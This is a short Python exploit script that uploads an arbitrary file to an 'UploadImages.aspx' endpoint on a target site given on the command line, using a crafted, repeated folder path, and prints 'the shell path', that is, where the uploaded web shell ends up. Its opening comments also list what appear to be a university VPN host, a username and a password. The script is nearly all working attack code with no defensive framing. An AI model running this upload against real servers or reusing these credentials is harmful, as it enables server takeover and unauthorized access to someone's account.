#info:myvpn.swjtu.edu.cn
#username:2016044855
#passwd:swjtu2022

import requests
import sys

url = sys.argv[1]
path = sys.argv[2]

posturl = url+"./UploadImages.aspx?folder=%2fPic%2fShopCart%2f./UploadImages.aspx?folder=%2fPic%2fShopCart%2f./UploadImages.aspx?folder=%2fPic%2fShopCart%2f"
upfile = {"filedata":open(path,"rb")}
res = requests.post(url = posturl,files=upfile)
print("the shell path:"+url+res.text[4:])